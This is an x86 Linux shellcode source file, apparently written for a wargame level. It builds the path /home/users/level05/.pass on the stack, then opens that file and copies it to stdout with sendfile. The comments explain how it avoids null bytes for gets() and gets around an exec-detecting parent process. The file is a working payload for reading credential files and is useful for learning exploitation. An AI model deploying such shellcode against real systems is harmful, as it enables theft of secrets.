section .text
    global _start
_start:
    ; Global rules:
    ;   - no instruction must resolve to a null byte (\x00) or newline (\x0a) in the final generated shellcode. `gets()` would consider it the end of the string.
    ;   - `exec` calls are impossible as the parent freezes the process when one is detected.
    ; sys_open(PATHNAME, FLAGS, MODE);
    ; 1. The EBX register represents the PATHNAME parameter. It must hold the address to the string "/home/users/level05/.pass";
    ; 2. The ECX register represents the FLAGS parameter. It will be set to `O_RDONLY` (0).
    ; 3. The EDX register represents the MODE parameter. It is unecessary and will be kept to 0.
    ; 4. Make the syscall: it's ID is 5 (0x5) and must be set in the EAX register. The returned file descriptor is stored in EAX.
    ; sys_sendfile(OUT_FD, IN_FD, OFFSET, COUNT);
    ; 1. The EBX register represents the OUT_FD parameter. It will be set to 1 (stdout).
    ; 2. The ECX register represents the IN_FD parameter. It must hold the file descriptor returned by sys_open.
    ; 3. The EDX register represents the OFFSET parameter. Kept NULL (0) to copy from the start of the file.
    ; 4. The ESI register represents the COUNT parameter. The maximum number of bytes to copy; we pass 0xffffffff so the whole file is sent (sendfile copies in-kernel, no userspace buffer needed).
    ; 5. Make the syscall: it's ID is 187 (0xbb) and must be set in the EAX register.
    ; sys_exit(CODE)
    ; 1. The EBX register represents the CODE parameter. Let's put it at 1 by principle.
    ; 2. Make the syscall: it's ID is 1 (0x1) and must be set in the EAX register.

    ; 1. Build "////home/users/level05/.pass\0" on the stack.
    xor eax, eax        ; EAX = 0x00000000
    push eax            ; Push "\0\0\0\0": the null terminator (nulls come from the zeroed EAX, no null byte in the code).
    push 0x73736170     ; "pass"
    push 0x2e2f3530     ; "05/."
    push 0x6c657665     ; "evel"
    push 0x6c2f7372     ; "rs/l"
    push 0x6573752f     ; "/use"
    push 0x656d6f68     ; "home"
    push 0x2f2f2f2f     ; "////" One or multiple '/' are equivalent for pathing. We use it as padding.

    ; 2. sys_open: EBX = PATHNAME, ECX = flags, EDX = mode, EAX = syscall number.
    mov ebx, esp        ; EBX = PATHNAME (pointer to the string on the stack).
    xor ecx, ecx        ; ECX = O_RDONLY (0).
    xor edx, edx        ; EDX = mode (unused for O_RDONLY).
    mov al, 0x5         ; EAX = 5 (sys_open). EAX is still 0, so writing only AL avoids null bytes in the generated shellcode.
    int 0x80            ; Execute syscall.

    ; 3. sys_sendfile: EBX = STDOUT, ECX = in_fd, EDX = offset, ESI = count, EAX = syscall number.
    mov ecx, eax        ; ECX = IN_FD (returned by sys_open).
    xor ebx, ebx        ; Zero out EBX to allow next operation.
    mov bl, 1           ; EBX = 1 (STDOUT). EBX is 0, so writing only BL avoids null bytes in the generated shellcode.
    xor edx, edx        ; EDX = offset = NULL (copy from the start).
    xor esi, esi        ; Zero out ESI to allow next operation.
    dec esi             ; ESI = 0xffffffff. -1 triggers a wrap around. -1 clamps count to the file size.
    xor eax, eax        ; Zero out EAX to allow next operation.
    mov al, 0xbb        ; EAX = 187 (sys_sendfile). EAX is 0, so writing only AL avoids null bytes in the generated shellcode.
    int 0x80            ; Execute syscall.

    ; 4. sys_exit: EBX = exit code, EAX = syscall number.
    xor ebx, ebx        ; Zero out EBX to allow next operation.
    mov bl, 1           ; EBX = 1 (exit code). EBX is 0, so writing only BL avoids null bytes in the generated shellcode.
    xor eax, eax        ; Zero out EAX to allow next operation.
    mov al, 1           ; EAX = 1 (sys_exit). EAX is 0, so writing only AL avoids null bytes in the generated shellcode.
    int 0x80            ; Execute syscall.
